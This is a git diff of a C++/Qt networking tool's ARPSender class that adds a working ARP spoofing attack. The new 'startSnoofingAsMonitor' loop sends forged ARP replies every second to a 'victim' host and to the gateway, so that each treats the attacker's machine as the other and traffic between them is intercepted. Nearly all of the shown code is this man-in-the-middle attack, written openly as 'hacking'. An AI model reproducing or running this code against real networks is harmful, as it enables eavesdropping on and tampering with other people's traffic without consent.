@@ -47,9 +47,15 @@ void ARPSender::queryMacAddress(const QString& dest_ip)
     inet_aton(dest_ip.toLatin1().data(), &dest_addr);
     void *reply_sender_addr = &(packet.arp.send_ip_addr);
     void *request_dest_addr = &dest_addr;
+
+    for(int i = 0; i < MAC_ADDR_LEN; i++){
+        dest_mac[i] = 0xFF;
+    }
+
     while(memcmp(reply_sender_addr, request_dest_addr, sizeof(dest_addr)) != 0){
         sendARP(dest_ip, ARP_REQUEST);
         receiveARP();
+        qDebug() << "arp packet from ip: " << inet_ntoa(*((struct in_addr*)reply_sender_addr));
     }
     getDestMacAddr();
 }
@@ -93,14 +99,13 @@ void ARPSender::sendARP(const QString &dest_ip, quint16 arp_type)
 
 }
 
-
 void ARPSender::pack(const QString &ip, quint16 arp_type)
 {
     //-----Fill ethernet header
 //    char lan_mac[] = {0xDC, 0x85, 0xDE, 0x60, 0x65, 0xE8};
     //Target MAC address
     for(int i = 0; i < MAC_ADDR_LEN; i++){
-        packet.ethHeader.target_hw_addr[i] = 0xFF;
+        packet.ethHeader.target_hw_addr[i] = dest_mac[i];
     }
     //Source MAC address
     for(int i = 0; i < MAC_ADDR_LEN; i++){
@@ -148,14 +153,12 @@ void ARPSender::pack(const QString &ip, quint16 arp_type)
     bzero(&packet.arp.padding, sizeof(packet.arp.padding));
 }
 
-
 void ARPSender::receiveARP()
 {
     int num = -1;
     num = recvfrom(sockfd, &packet, sizeof(packet), 0, NULL, 0);
     if(num < 0){
         qDebug() << "recvfrom error";
-        return;
     }else{
         qDebug()  << "received " << num << " bytes.";
     }
@@ -164,33 +167,61 @@ void ARPSender::receiveARP()
 
 void ARPSender::getDestMacAddr()
 {
-    QString dest_mac= "";
+    QString dest_mac_string= "";
 
     for(int i = 0; i < MAC_ADDR_LEN - 1; i++){
-        dest_mac.append(QString::number(packet.arp.send_hw_addr[i], 16));
-        dest_mac.append(":");
+        HostInfo::victim_mac[i] = packet.arp.send_hw_addr[i];
+        dest_mac_string.append(QString::number(packet.arp.send_hw_addr[i], 16));
+        dest_mac_string.append(":");
     }
-    dest_mac.append(QString::number(packet.arp.send_hw_addr[MAC_ADDR_LEN - 1], 16));
-    emit macAddressReturned(dest_mac);
+    HostInfo::victim_mac[MAC_ADDR_LEN - 1] = packet.arp.send_hw_addr[MAC_ADDR_LEN - 1];
+    dest_mac_string.append(QString::number(packet.arp.send_hw_addr[MAC_ADDR_LEN - 1], 16));
+    emit macAddressReturned(dest_mac_string);
+}
+
+void ARPSender::setDestMacGateway()
+{
+    for(int i = 0; i < MAC_ADDR_LEN; i++){
+        dest_mac[i] = HostInfo::gateway_mac[i];
+    }
+}
+
+void ARPSender::setDestMacVictim()
+{
+    for(int i = 0; i < MAC_ADDR_LEN; i++){
+        dest_mac[i] = HostInfo::victim_mac[i];
+    }
 }
 
 //Send destination ip ARPs with a faked ip
-void ARPSender::sendFakedARP(const QString &dest_ip, const QString &faked_ip)
+void ARPSender::startSnoofingAsMonitor(const QString &victim_ip, const QString &faked_ip)
 {
     hacking = true;
-    fakeIP(faked_ip);
 
     while(hacking){
-        sendARP(dest_ip, ARP_REPLY);
+        //Tell "dest ip" I'm the "faked ip"
+        setDestMacVictim();
+        fakeIP(faked_ip);
+        sendARP(victim_ip, ARP_REPLY);
+\
+        //Tell gateway I'm the "dest ip", so send packets to me, which "dest ip" should gets
+        setDestMacGateway();
+        fakeIP(victim_ip);
+        sendARP(faked_ip, ARP_REPLY);
+
         sleep(1);
         qDebug() << "Send one arp";
     }
-
     resetSelfIP();
 }
 
+void ARPSender::sendFakedARP(const QString &victim_ip, const QString &faked_ip)
+{
+
+}
+
 //Called by SendARPSnoofingThread, to stop this ARP hacking
-void ARPSender::stopSendFakedARP()
+void ARPSender::stopSnoofing()
 {
     qDebug() << "Let's stop this!";
     hacking = false;
